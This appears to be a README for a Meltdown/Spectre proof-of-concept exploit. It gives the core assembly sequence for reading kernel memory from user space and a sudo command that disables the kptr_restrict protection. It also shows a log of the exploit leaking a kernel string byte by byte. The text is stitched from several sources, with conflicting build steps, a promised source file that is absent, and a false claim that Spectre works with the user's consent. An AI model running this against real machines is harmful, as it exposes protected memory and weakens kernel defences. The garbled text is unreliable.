(Proof of concept - FOR EDUCATIONAL AND SELF TEST PURPOSES ONLY)

Revision 0.1 

INTEL PROCESSOR SPECTRE EXPLOIT SOURCE CODE -  Spectre-Meltdown.c

Build with: cc Spectre-Meltdown.c  and run with ./output.o


Spectre breaks the isolation between different applications. It allows an attacker to trick error-free programs, which follow best practices, into leaking their secrets. In fact, the safety checks of said best practices actually increase the attack surface and may make applications more susceptible to Spectre

Spectre is slightly different from Meltdown. This is so because it can allow hackers to fool the applications (even the stable versions of the respective application) running on a machine to give up secret information from the Kernal module of the operating system to the hacker with the consent or knowledge of the user.





# MELTDOWN EXPLOIT 
INTEL PROCESSOR MELTDOWN EXPLOIT SOURCE CODE"



The Intel Processor core instruction sequence of Meltdown: -

; rcx = kernel address

; rbx = probe array

retry:

mov al, byte [rcx]

shl rax, 0xc

jz retry

mov rbx, qword [rbx + rax]



Meltdown breaks the most fundamental isolation between user applications and the operating system. This attack allows a program to access the memory, and thus also the secrets, of other programs and the operating system.

This vulnerability would allow malicious attacks to take place when a hacker could break the differentiating factor between the applications run by the user and the Core Memory of the Computer.

Speculative optimizations execute code in a non-secure manner leaving data
traces in microarchitecture such as cache.

Refer to the paper by Lipp et. al 2017 for details: https://meltdownattack.com/meltdown.pdf.

Can only dump `linux_proc_banner` at the moment, since requires accessed memory
to be in cache and `linux_proc_banner` is cached on every read from
`/proc/version`. Might work with `prefetch`.


Because your system may be preventing the program from reading kernel symbols in /proc/kallsyms due to /proc/sys/kernel/kptr_restrict set to 1. The following command will do the tricky:

sudo sh -c "echo 0 > /proc/sys/kernel/kptr_restrict"


Build with `make`, run with `./run.sh`.

Ref. Breaking kernel Address Space Layout Randomization	with Intel TSX:
https://www.blackhat.com/docs/us-16/materials/us-16-Jang-Breaking-Kernel-Address-Space-Layout-Randomization-KASLR-With-Intel-TSX.pdf

Ref. Differences between ASLR, KASLR and KARL:
http://www.daniloaz.com/en/differences-between-aslr-kaslr-and-karl/


Flush+Reload and target array approach taken from spectre paper https://spectreattack.com/spectre.pdf
implemented following clues from https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/.

Pandora's box is open.

Result:
```
$ make
cc -O2 -msse2   -c -o meltdown.o meltdown.c
cc   meltdown.o   -o meltdown
$ ./run.sh 
looking for linux_proc_banner in /proc/kallsyms
protected. requires root
+ find_linux_proc_banner /proc/kallsyms sudo
+ sudo awk 
	/linux_proc_banner/ {
		if (strtonum("0x"$1))
			print $1;
		exit 0;
	} /proc/kallsyms
+ linux_proc_banner=ffffffffa3e000a0
+ set +x
cached = 29, uncached = 271, threshold 88
read ffffffffa3e000a0 = 25 %
read ffffffffa3e000a1 = 73 s
read ffffffffa3e000a2 = 20  
read ffffffffa3e000a3 = 76 v
read ffffffffa3e000a4 = 65 e
read ffffffffa3e000a5 = 72 r
read ffffffffa3e000a6 = 73 s
read ffffffffa3e000a7 = 69 i
read ffffffffa3e000a8 = 6f o
read ffffffffa3e000a9 = 6e n
read ffffffffa3e000aa = 20  
read ffffffffa3e000ab = 25 %
read ffffffffa3e000ac = 73 s
read ffffffffa3e000ad = 20  
read ffffffffa3e000ae = 28 (
read ffffffffa3e000af = 62 b
read ffffffffa3e000b0 = 75 u
read ffffffffa3e000b1 = 69 i
read ffffffffa3e000b2 = 6c l
read ffffffffa3e000b3 = 64 d
read ffffffffa3e000b4 = 64 d
read ffffffffa3e000b5 = 40 @
VULNERABLE
VULNERABLE ON
4.10.0-42-generic #46~16.04.1-Ubuntu SMP Mon Dec 4 15:57:59 UTC 2017 x86_64
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 158
model name	: Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz
stepping	: 9
microcode	: 0x5e
cpu MHz		: 3499.316
cache size	: 6144 KB
physical id	: 0
```

# Does not work

If it compiles but fails with `Illegal instruction` then either your hardware
is very old or it is a VM. Try compiling with:

```shell
$ make CFLAGS=-DHAVE_RDTSCP=0 clean all
```


